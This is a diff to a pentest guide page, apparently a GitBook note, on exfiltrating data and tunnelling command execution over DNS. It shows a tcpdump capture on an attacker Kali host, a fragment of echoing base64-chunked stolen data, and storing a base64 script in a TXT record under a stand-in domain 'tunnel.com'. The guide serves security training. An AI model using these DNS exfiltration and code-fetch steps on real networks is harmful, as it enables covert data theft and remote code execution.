@@ -23,9 +23,12 @@ Now let's discuss the Data Exfiltration over DNS requirements and steps, which a
 
 ## Practice
 
-We concider that a NS record named `t1.tunnel.com` as been registred. It's poiting the Attacking IP.
 {% tabs %}
 {% tab title="Manualy" %}
+{% hint style="info" %}
+We concider that a NS record named `t1.tunnel.com` as been registred. It's poiting the Attacking IP.
+{% endhint %}
+
 In order to receive any DNS request on the attacking machine, we need to capture the network traffic for any incoming UDP/53 packets using the [tcpdump](https://github.com/the-tcpdump-group/tcpdump) tool.  
 ```bash
 v4resk@kali$ sudo tcpdump -i eth0 udp port 53 -v 
@@ -62,7 +65,7 @@ v4resk@kali$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCk
 
 {% tab title="Command Execution" %}
 Let's see how can tunneling code execution via the DNS protocol.
-We first need to create a TXT record containing our script encoded in base64. Let's take`script.tunnel.com` as example.
+We first need to create a `TXT` record containing our script encoded in base64. Let's take`script.tunnel.com` as example.
 
 ```bash
 #Check if the TXT record is well configured
